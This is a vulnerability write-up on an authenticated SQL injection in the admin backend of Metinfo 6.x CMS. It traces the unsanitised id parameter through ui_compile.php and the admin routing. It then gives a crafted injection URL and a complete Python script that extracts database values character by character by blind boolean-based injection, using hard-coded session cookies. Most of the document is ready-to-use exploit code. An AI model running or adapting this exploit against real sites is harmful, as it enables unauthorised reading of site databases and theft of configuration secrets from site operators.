# Metinfo 6.x Background SQL injection

Line 790 of app/system/include/class/view/ui\_compile.php 

The get\_field\_text function at the beginning of the line

```php
   /*----------------- 前台可视化操作---------------------*/

    public function get_field_text($table, $field, $id){
        global $_M;

        $query = "SELECT * FROM {$_M['table'][$table]} WHERE id = {$id}";
        $res = DB::get_one($query);
        if(!$res){
            return false;
        }
        $this->response['status'] = 1;
        $this->response['text'] = $res[$field];
        if($table == 'templates'){
            $this->response['type'] = $res['type'];
        }

        return $this->response;
    }
```

In ` $query `, directly to the id in the SQL statement


Go back up, global search，and find app/system/ui\_set/admin/index.class.php

```php
/**
	* 前端通过表、字段、id来获取文本内容
	* @DateTime 2017-11-09
	* @return   json
	*/
public function doget_text_content(){
	global $_M;
	$table = $_M['form']['table'];
	$field = $_M['form']['field'];
	$id = $_M['form']['id'];
	#load::sys_class('view/ui_compile');
	$ui_compile = load::sys_class('view/ui_compile','new');
	$content = $ui_compile->get_field_text($table,$field,$id);
	echo jsonencode($content);die;
}
```

The function doget\_text\_content call get_field_text，And all three parameters are retrieved from the form，This function is then called

If you're familiar with metinfo，/admin/index.php You can call any method that begins with 'do'

```php
define('IN_ADMIN', true);
//�ӿ�
$M_MODULE='admin';
if(@$_GET['m'])$M_MODULE=$_GET['m'];
if(@!$_GET['n'])$_GET['n']="index";
if(@!$_GET['c'])$_GET['c']="index";
if(@!$_GET['a'])$_GET['a']="doindex";
@define('M_NAME', $_GET['n']);
@define('M_MODULE', $M_MODULE);
@define('M_CLASS', $_GET['c']);
@define('M_ACTION', $_GET['a']);
require_once '../app/system/entrance.php';
```

Here, the doget\_text\_content function is just the beginning of 'do'，Analysis of the /app/system/entrance.php and tectonic utilization chain

```php
admin/index.php?n=ui_set&m=admin&c=index&a=doget_text_content&table=lang&field=1&id=1%20and%20(length((1))=1)
```

exploit(need to login)：

```python
#coding: utf-8
import requests
import string

url = 'http://{}/admin/index.php?n=ui_set&m=admin&c=index&a=doget_text_content&table=lang&field=1&id='

cookies = {'PHPSESSID':'2a466962d449c985384d778b0baa4b91','met_key':'Kk1PIKr','met_auth':'4e62Obpf1dkI9%2BnpVFlvSwTHNRpwR1KRez5rGREZOpqZlT3Xox6Wn%2FnU%2BnEnVoePzYtgJBs9arFHHD%2B99qXxBhYdJw'}

def get_res_len(host,sql):
	global url
	url = url.format(host)
	max_len = 101
	s = requests.session()
	for i in range(1,max_len):
		check_sql = "1 and (length(({}))={})".format(sql,str(i))
		res = s.get(url+check_sql,cookies=cookies)
		if "{}" not in res.text:
			print i
			return i
	print ("data too long")

def get_sqli_data(host,sql):
	global url
	data_len = get_res_len(host,sql)
	sqli = "1 and (ascii(substr(({}),{},1)))={}"
	data = ""
	s = requests.session()
	for i in range(data_len+1):
		for c in string.printable[0:62]:
			res = s.get(url+sqli.format(sql,str(i),ord(c)),cookies=cookies)
			if "status" in res.text:
				data += c
				print (data)

if __name__ == "__main__":
	host = ""
	sql = "select value from met_config where id = 45"
	get_sqli_data(host,sql)
```

For example, get a parameter in met\_config

![](https://i.loli.net/2019/05/12/5cd7bb7f13ffc.png)

